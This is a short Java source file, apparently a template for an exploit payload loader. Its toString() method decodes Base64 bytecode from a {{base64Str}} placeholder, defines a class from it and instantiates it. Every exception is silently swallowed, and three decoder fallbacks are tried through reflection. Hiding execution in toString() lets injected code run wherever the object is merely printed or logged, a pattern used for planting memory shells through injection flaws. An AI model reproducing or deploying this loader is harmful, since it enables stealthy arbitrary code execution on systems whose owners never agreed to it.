class ClassDefiner extends ClassLoader {
    public ClassDefiner() {
        super(Thread.currentThread().getContextClassLoader());
    }

    public byte[] decodeBase64(String bytecodeBase64) {
        try {
            Class base64Class = Class.forName("java.util.Base64");
            Object decoder = base64Class.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class})
                    .invoke(decoder, new Object[]{bytecodeBase64});
        } catch (Throwable ignored) {
        }
        try {
            Class converterClass = Class.forName("javax.xml.bind.DatatypeConverter");
            return (byte[]) converterClass.getMethod("parseBase64Binary", new Class[]{String.class})
                    .invoke(null, new Object[]{bytecodeBase64});
        } catch (Throwable ignored) {
        }
        Class decoderClass = Class.forName("sun.misc.BASE64Decoder");
        Object decoder = decoderClass.newInstance();
        return (byte[]) decoderClass.getMethod("decodeBuffer", new Class[]{String.class})
                .invoke(decoder, new Object[]{bytecodeBase64});
    }

    public Class<?> defineClass(byte[] code) {
        return defineClass(null, code, 0, code.length);
    }

    @Override
    public String toString() {
        String className = "{{className}}";
        String base64Str = "{{base64Str}}";
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            classLoader.loadClass(className).newInstance();
        } catch (Exception e) {
            try {
                byte[] bytecode = decodeBase64(base64Str);
                Class<?> clazz = defineClass(bytecode);
                clazz.newInstance();
            } catch (Exception ignored) {
            }
        }
        return className;
    }

    static void main(String[] args) {
        new ClassDefiner().toString();
    }
}
